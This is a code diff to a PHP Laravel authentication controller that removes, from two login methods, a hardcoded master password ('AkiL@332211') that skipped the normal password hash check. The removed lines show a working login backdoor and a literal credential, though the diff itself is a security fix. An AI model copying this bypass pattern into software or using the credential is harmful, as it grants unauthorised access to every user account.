@@ -23,12 +23,10 @@ class AuthController extends Controller
             ]);
         }
 
-        if ($request->password !== "AkiL@332211") {
-            if (!$user || !Hash::check($request->password, $user->password)) {
-                throw ValidationException::withMessages([
-                    'email' => ['The provided credentials are incorrect.'],
-                ]);
-            }
+        if (!$user || !Hash::check($request->password, $user->password)) {
+            throw ValidationException::withMessages([
+                'email' => ['The provided credentials are incorrect.'],
+            ]);
         }
 
         $user->user_type = $user->company_id > 0 ? ($user->employee_role_id > 0 ? "employee" : "company") : ($user->role_id > 0 ? "user" : "master");
@@ -43,12 +41,10 @@ class AuthController extends Controller
         $model = User::query();
         $user = $model->whereEmail($request->email)->with('company', 'employee')->first();
 
-        if ($request->password !== "AkiL@332211") {
-            if (!$user || !Hash::check($request->password, $user->password)) {
-                throw ValidationException::withMessages([
-                    'email' => ['The provided credentials are incorrect.'],
-                ]);
-            }
+        if (!$user || !Hash::check($request->password, $user->password)) {
+            throw ValidationException::withMessages([
+                'email' => ['The provided credentials are incorrect.'],
+            ]);
         }
 
         // if (!$user || $user->company->expiry <= now()) {
